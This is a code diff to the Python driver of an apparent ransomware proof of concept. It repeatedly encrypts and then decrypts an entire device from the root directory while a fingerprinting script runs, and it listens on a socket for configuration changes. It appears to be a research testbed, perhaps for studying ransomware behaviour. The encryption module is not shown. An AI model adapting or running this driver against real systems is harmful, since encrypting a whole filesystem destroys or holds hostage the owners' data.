@@ -2,7 +2,7 @@ from json import loads
 from multiprocessing import Process
 from os import path
 from socket import AF_INET, SOCK_STREAM, socket
-from subprocess import call
+from subprocess import Popen
 
 from globals import update_existing_config
 from rwpoc import run
@@ -25,40 +25,44 @@ def listen_for_config_changes():
                     update_existing_config(new_config)
 
 
-def collect_device_fingerprint():
-    call(path.join(path.abspath(path.curdir), "fingerprinter.sh")+" -n 500", shell=True)
-    with open("./rw-done.txt", "w") as file:
-        file.write("1")
+def kill_process(proc):
+    if isinstance(proc, Process):
+        print("kill Process", proc)
+        proc.kill()
+        proc.join()
+    elif isinstance(proc, Popen):
+        print("kill Popen", proc)
+        proc.kill()
+        proc.wait()
 
 
 if __name__ == "__main__":
+    procs = []
     proc_config = Process(target=listen_for_config_changes)
+    procs.append(proc_config)
     proc_config.start()
 
-    proc_fp = Process(target=collect_device_fingerprint)
-
     try:
-        with open("./rw-done.txt", "w") as file:
-            file.write("0")
-        done = False
         abs_paths = "/"  # encrypt entire device, starting from root directory
 
         while True:
-            with open("./rw-done.txt", "r") as file:
-                content = file.read()
-                if content == "1":
-                    done = True
-            if done:
-                break
+            # input("\nEnter: start encrypting")
 
-            proc_fp.start()
+            proc_fp = Popen(path.join(path.abspath(path.curdir), "fingerprinter.sh"))
+            procs.append(proc_fp)
+
+            # input("\nwait shortly for child to start")
+            print("ENCRYPT")
+
             run(encrypt=True, absolute_paths=abs_paths)  # encrypt
-            proc_fp.terminate()
-            proc_fp.join()
+            kill_process(proc_fp)
+            procs.remove(proc_fp)
+
+            # input("\nEnter: start decrypting")
+            print("DECRYPT")
 
             run(encrypt=False, absolute_paths=abs_paths)  # decrypt
     finally:
-        proc_fp.terminate()
-        proc_config.terminate()
-        proc_fp.join()
-        proc_config.join()
+        print("finally")
+        for proc in procs:
+            kill_process(proc)
